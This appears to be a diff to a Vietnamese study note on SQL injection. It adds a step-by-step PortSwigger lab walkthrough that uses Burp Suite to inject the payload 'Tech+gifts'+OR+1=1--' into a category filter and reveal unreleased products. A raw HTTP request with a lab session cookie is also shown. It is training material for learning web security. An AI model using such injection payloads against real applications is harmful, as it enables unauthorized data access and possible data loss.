@@ -67,7 +67,62 @@ https://insecure-website.com/products?category=Gifts'+OR+1=1--
 SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
 ```
 
-Truy vấn này trả về mọi kết quả có `category = Gifts` hoặc `1=1`, hay mệnh đề `true` và truy vấn trả về mọi kết quả.
+Truy vấn này trả về mọi kết quả có `category = Gifts` hoặc `1 = 1`, hay mệnh đề `true` và truy vấn trả về mọi kết quả.
 
 > ## Lưu ý
 > Khi chèn điều kiện OR 1=1 vào một truy vấn SQL, ngay cả khi điều này có vẻ vô hại trong ngữ cảnh mà bạn đang chèn vào, thì việc các ứng dụng sử dụng dữ liệu từ một yêu cầu duy nhất trong nhiều truy vấn khác nhau là điều rất phổ biến. Nếu điều kiện của bạn được áp dụng cho một câu lệnh UPDATE hoặc DELETE, ví dụ như vậy, nó có thể gây ra mất dữ liệu ngoài ý muốn.
+
+# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+Bài lab này chứa một lỗ hổng SQL injection liên quan đến bộ lọc về loại mặt hàng. Khi người dùng chọn một loại mặt hàng, ứng dụng sẽ thực hiện một truy vấn SQL như sau:
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+```
+
+Để giải bài lab này, hãy thực hiện tấn công SQL injection và xuất ra ít nhất một sản phẩm chưa được phát hành.
+
+## Các bước thực hiện
+
+1. Mở **BurpSuite**, chọn tab **Proxy**.
+2. Chọn **Open browser**, truy cập vào URL của bài lab và điều chỉnh kích thước cửa sổ để quan sát cả 2 ứng dụng.
+
+![Configure window size](images/1.png)
+
+3. Chọn **Intercept is off** để chuyển nó sang **Intercept is on**.
+4. Chọn một loại mặt hàng bất kỳ trên ứng dụng, ở ví dụ này tôi chọn *Tech gifts*.
+5. Bỏ qua gói tin PING bằng cách nhấn **Forward**.
+6. Phân tích gói tin ta sẽ thấy phần `category=Tech+gifts`.
+
+```
+GET /filter?category=Tech+gifts HTTP/2
+Host: 0acf0092030fea408003951800f6008e.web-security-academy.net
+Cookie: session=cY6Hd4SqjPVZvbrqetjcwXHgbbdGigPp
+Sec-Ch-Ua: "Chromium";v="123", "Not:A-Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0acf0092030fea408003951800f6008e.web-security-academy.net/filter?category=Pets
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+```
+
+7. Sửa thông tin `category` thành `category=Tech+gifts'+OR+1=1--`. Lúc này ứng dụng sẽ thực hiện một truy vấn SQL như sau:
+
+```sql
+SELECT * FROM products WHERE category = 'Tech gifts' OR 1=1--' AND released = 1
+```
+- Mệnh đề `WHERE` sẽ tìm kiếm các sản phẩm có `category = 'Tech gifts'` hoặc `1=1` (luôn đúng), tức sẽ trả về mọi sản phẩm.
+- Dấu `--` sử dụng để đưa mệnh đề `AND` vào phần bình luận và không thực hiện nó, từ đó lấy được thông tin về các sản phẩm chưa phát hành.
+
+8. Chọn **Forward** để gửi gói tin, ứng dụng sẽ trả về kết quả như yêu cầu, kèm với thông báo đã hoàn thành bài lab.
+
+![Finish WHERE](images/2.png)
+
